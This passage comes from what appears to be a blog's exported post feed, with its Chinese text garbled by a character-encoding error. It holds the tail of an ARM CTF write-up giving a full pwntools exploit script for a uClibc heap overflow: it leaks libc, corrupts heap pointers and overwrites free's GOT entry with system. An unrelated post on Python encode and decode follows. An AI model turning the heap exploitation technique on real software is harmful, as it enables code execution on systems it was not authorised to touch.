<code>glibc</code>ä¸­å…ƒæ•°æ®åœ¨ å—çš„å¼€å¤´ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå †æº¢å‡ºï¼Œæˆ‘ä»¬å°±éœ€è¦è¦†ç›–åˆ°ä¸‹é¢ç©ºé—²ç©ºé—´çš„ <code>heap_free_area</code> ä¸­çš„ æŒ‡é’ˆï¼Œæ‰èƒ½å®ç° <code>uClibc</code>ä¸­çš„ <code>unlink</code> æ”»å‡»</p><p>è¯¦ç»†ä»‹ç»uclibcçš„åšå®¢ï¼š<a href="https://www.cnblogs.com/hac425/p/9416738.html">https://www.cnblogs.com/hac425/p/9416738.html</a></p><p>è€Œæœ¬é¢˜ä¸­ç”±äºeditå‡½æ•°å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é¦–å…ˆæ„é€ <code>overlop</code>æ³„éœ²<code>libc</code>ä¹‹ååˆ©ç”¨å †æº¢å‡ºè¦†ç›– <code>heap_free_area</code> ä¸­çš„ æŒ‡é’ˆä¸º<code>heaplist</code>é€ æˆ<code>unlink</code>æœ€ååˆ©ç”¨editå‡½æ•°è¦†ç›–freeçš„gotä¸ºsystem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./lib&quot;</span>,<span class="string">&quot;./a.out&quot;</span>])</span><br><span class="line"><span class="comment">#qemu-arm -L ./lib ./a.out</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">l,note</span>):</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(l))</span><br><span class="line">     p.sendafter(<span class="string">&quot;:&quot;</span>,note)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,l,note</span>):</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(l))</span><br><span class="line">     p.sendafter(<span class="string">&quot;:&quot;</span>,note)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#3</span></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x1c</span>+p64(<span class="number">0x500</span>+<span class="number">0x20</span>+<span class="number">1</span>))  <span class="comment">#åˆ©ç”¨å †æº¢å‡ºæ„é€ overlopå³ä½¿2å·å †å—uaf</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#2å·å †å—ä¸­å­˜åœ¨æŒ‡å‘main_arean+88çš„åœ°å€</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;2 : &quot;</span>)</span><br><span class="line">libc=u32(p.recv(<span class="number">4</span>))+<span class="number">0xff720000</span>-<span class="number">0xff7ba8ec</span></span><br><span class="line">success(<span class="string">&#x27;libc: &#x27;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)  <span class="comment">#4  4å·å’Œ2å·æŒ‡å‘åŒä¸€å †å—</span></span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">&quot;aaaaaaa&quot;</span>)   <span class="comment">#5</span></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">change(<span class="number">2</span>,<span class="number">8</span>,p32(<span class="number">0x21048</span>^<span class="number">0x22</span>))  <span class="comment">#ä½¿ç­‰ä¸‹ç”³è¯·å›æ¥çš„4å·å †å—æŒ‡å‘heaplist</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaa&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaaa&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">change(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x28</span>)+p32(<span class="number">0x21038</span>)) <span class="comment">#ä½¿0å·å †pträ¸ºfree_got(0x21038)</span></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x8</span>,p32(libc+<span class="number">0x51800</span>))  <span class="comment">#è¦†ç›–got</span></span><br><span class="line"><span class="comment">#show()</span></span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ARM_PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python en(de)code</title>
      <link href="/2019/04/06/python-en-de-code/"/>
      <url>/2019/04/06/python-en-de-code/</url>
      
        <content type="html"><![CDATA[<h1 id="å…ˆä¸Šä»£ç "><a href="#å…ˆä¸Šä»£ç " class="headerlink" title="å…ˆä¸Šä»£ç "></a><strong>å…ˆä¸Šä»£ç </strong></h1><p><a href="https://github.com/CodingAngela/Angela/blob/master/spider%EF%BC%88www.dytt8.net">pythonçˆ¬è™«</a></p><p>ä»£ç å†™æŒºé•¿çš„ï¼Œä¹Ÿæ˜¯è¾¹å­¦è¾¹å†™ï¼Œä½†ä¸€ç›´æä¸æ¸…æ¥špythonçš„encode(ç¼–ç )å’Œdecode(è§£ç )ã€‚ä»¥ä¸‹æ˜¯æˆ‘çš„æ¢ç©¶ä¹‹è·¯ã€‚</p><span id="more"></span><h2 id="ä¸€ã€å½“ç„¶å…ˆçœ‹å®˜æ–¹æ–‡æ¡£"><a href="#ä¸€ã€å½“ç„¶å…ˆçœ‹å®˜æ–¹æ–‡æ¡£" class="headerlink" title="ä¸€ã€å½“ç„¶å…ˆçœ‹å®˜æ–¹æ–‡æ¡£"></a>ä¸€ã€å½“ç„¶å…ˆçœ‹å®˜æ–¹æ–‡æ¡£</h2><p><a href="https://docs.python.org/3/library/stdtypes.html?highlight=encode#string-methods">åœ°å€å¦‚ä¸‹</a></p><p>é‡Œé¢æåˆ°encodeå‡½æ•°â€˜Return an encoded version of the string as a bytes object.â€™å°±æ˜¯å°†å­—ç¬¦ä¸²è¿›è¡Œç¼–ç ï¼Œè¿”å›å¾—åˆ°bytesç±»å‹å¯¹è±¡ï¼Œ</p><p>è€Œdecodeå‡½æ•°æ­£å¥½ç›¸åï¼Œæ˜¯å°†bytesè§£ç ä¸ºå­—ç¬¦ä¸²ç±»å‹ã€‚</p><h2 id="äºŒã€å®é™…æ“ä½œä¸€ä¸‹"><a href="#äºŒã€å®é™…æ“ä½œä¸€ä¸‹" class="headerlink" title="äºŒã€å®é™…æ“ä½œä¸€ä¸‹"></a>äºŒã€å®é™…æ“ä½œä¸€ä¸‹</h2><p>ç›´æ¥ä»¥çˆ¬è™«ä»£ç ä¸ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>runä¸€ä¸‹ä¹‹åä¼šå‘ç°å¾ˆå¤šä¹±ç ![](C:\Users\admin\Pictures\Camera Roll\11.PNG)</p><p>æŸ¥äº†ä¸€ä¸‹å‘ç°é—®é¢˜å¤„åœ¨.textä¸Šï¼Œ.textæ˜¯è¿”å›ç½‘é¡µçš„ç›¸åº”æ•°æ®ï¼Œå¹¶æŒ‰ç…§æœºå™¨è®¤ä¸ºçš„æœ€å¤§å¯èƒ½å»è§£ç æ¯”å¦‚utf-8ã€‚è€Œè§‚å¯Ÿæœ¬ç«™å‘ç°â€™charset&#x3D;gb2312â€™æ‰€ä»¥å‡ºç°äº†ä¹±ç ã€‚äºæ˜¯ï¼Œ</p><p>æˆ‘ç”¨encodingè§„å®šç”¨gb2312è§£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">response.encoding=<span class="string">&quot;gb2312&quot;</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>æœç„¶è§£å†³äº†ä¹±ç é—®é¢˜ï¼Œä½†è¿™å’Œencode,decodeæ²¡å•¥å…³ç³»ã€‚ã€‚ã€‚</p><p>æ¥ä¸‹æ¥å°±æœ‰å…³ç³»äº†ã€‚</p><p>æˆ‘æ¢äº†ä¸€ç§æ–¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure><p>å‘ç°çˆ¬åˆ°çš„æ˜¯bytesç±»å‹ï¼Œæ„è¯†åˆ°.contentè¿”å›çš„æ•°æ®æ˜¯ä¸è¿›è¡Œè§£ç çš„ï¼Œåˆç”±äºæ˜¯ç”±bytesåˆ°å­—ç¬¦ä¸²çš„è§£ç ï¼Œæ‰€ä»¥ä½¿ç”¨decode()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="built_in">print</span>(response.content.decode(<span class="string">&#x27;gb2312&#x27;</span>))</span><br></pre></td></tr></table></figure><p>ä¸€è¿è¡Œï¼Œwocï¼æŠ¥é”™äº†![](C:\Users\admin\Pictures\Camera Roll\12.PNG)</p><p>è¯´æ˜¯gb2312ä¸èƒ½è§£ç ï¼Œè¿™ä¸çŸ›ç›¾å—â€¦</p><p>äºæ˜¯èµ¶ç´§ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹å‘ç°gbkçš„è§£ç èŒƒå›´åŒ…å«äº†gb2312ï¼Œäºæ˜¯å°è¯•æ”¹ä¸ºgbkï¼Œé—®é¢˜è§£å†³ï¼ŒæˆåŠŸè§£ç ~</p><p>è¿™åªæ˜¯ç”¨äº†decode()ï¼Œé‚£å†ä½œæ­»ä¸€ä¸‹æŠŠè§£ç çš„å†ç¼–ç å›æ¥ï¼Œèµ°ä½ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line">r=response.content.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.encode(<span class="string">&#x27;gbk&#x27;</span>))</span><br></pre></td></tr></table></figure><p>æˆåŠŸç¼–ç ~![](C:\Users\admin\Pictures\Camera Roll\13.PNG)</p><p>ç»è¿‡äº†è¿™æ¬¡çš„æ¢ç´¢å°è¯•ï¼Œææ˜ç™½äº†Pythonç¼–ç å’Œè§£ç ï¼Œæœ€è¿‘åœ¨å­¦ä¹ æ±‡ç¼–ï¼Œç›¸ä¿¡ä¹‹åä»ç¡¬ä»¶çš„è§’åº¦ä¼šå¯¹ç¼–ç è§£ç è¿™æ–¹é¢æœ‰æ›´æ·±çš„ç†è§£!</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
